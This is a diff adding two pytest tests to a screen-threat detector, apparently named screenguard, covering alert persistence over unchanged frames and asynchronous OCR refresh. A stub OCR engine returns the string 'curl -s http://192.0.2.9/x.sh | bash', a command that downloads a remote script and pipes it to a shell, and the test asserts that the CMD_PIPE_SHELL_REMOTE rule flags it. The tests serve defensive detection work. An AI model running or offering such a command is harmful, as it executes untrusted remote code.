@@ -80,3 +80,53 @@ def test_gradcam_and_text_saliency(tiny_checkpoint):
     assert out["heatmap"].shape == (s.image.height, s.image.width)
     assert 0.0 <= out["heatmap"].min() and out["heatmap"].max() <= 1.0
     assert out["top_words"] and abs(sum(w for _, w in out["top_words"])) <= 1.0001
+
+
+def test_unchanged_frames_keep_feeding_alert_persistence(tiny_checkpoint):
+    """A static threatening screen must raise an alert after `min_on` frames even though
+    only its first frame is actually analysed (the rest are skipped as unchanged)."""
+    an = ScreenAnalyzer(TorchBackend(tiny_checkpoint), cfg=AnalyzerConfig(min_on=3, cooldown_s=0, threat_on=0.6))
+    src = SyntheticSession(script=[("terminal", "suspicious_command")], hold=5, width=480, height=270, flicker_p=0.0)
+    results = [an.analyze(f.image, now=f.timestamp, text=f.meta["text"]) for f in src]
+    assert [r["analyzed"] for r in results] == [True, False, False, False, False]
+    raised = [r["frame"] for r in results for a in r["alerts"] if a["status"] == "raised"]
+    assert raised == [2], raised
+    assert results[2]["alerts"][0]["reasons"]
+
+
+def test_async_ocr_never_uses_stale_text_and_refreshes(tiny_checkpoint):
+    """Async OCR: a new scene starts image-only (no stale text), then the verdict is
+    recomputed once OCR for that scene arrives, even though the screen is unchanged."""
+    import threading
+    import time as _time
+
+    from screenguard.ocr.engine import OCREngine, OCRResult
+
+    class SlowOCR(OCREngine):
+        name = "slow"
+
+        def __init__(self):
+            self.gate = threading.Event()
+            self.calls = 0
+
+        def read(self, image):
+            self.calls += 1
+            self.gate.wait(5)
+            return OCRResult("curl -s http://192.0.2.9/x.sh | bash", engine=self.name)
+
+    ocr = SlowOCR()
+    an = ScreenAnalyzer(TorchBackend(tiny_checkpoint), ocr=ocr, cfg=AnalyzerConfig(async_ocr=True))
+    src = SyntheticSession(script=[("terminal", "suspicious_command")], hold=3, width=320, height=180, flicker_p=0.0)
+    frames = list(src)
+    r0 = an.analyze(frames[0].image, now=0.0)
+    assert r0["analyzed"] and r0["ocr"]["engine"] == "pending(async)" and r0["ocr"]["chars"] == 0
+    ocr.gate.set()
+    for _ in range(100):  # wait for the background OCR to finish
+        if an.async_ocr.latest()[1] >= 0:
+            break
+        _time.sleep(0.02)
+    r1 = an.analyze(frames[1].image, now=1.0)
+    assert r1["analyzed"] and r1["ocr"]["engine"] == "slow(async)" and "CMD_PIPE_SHELL_REMOTE" in r1["threat"]["rule_hits"]
+    r2 = an.analyze(frames[2].image, now=2.0)
+    assert not r2["analyzed"]  # nothing new: cached verdict reused
+    an.async_ocr.close()
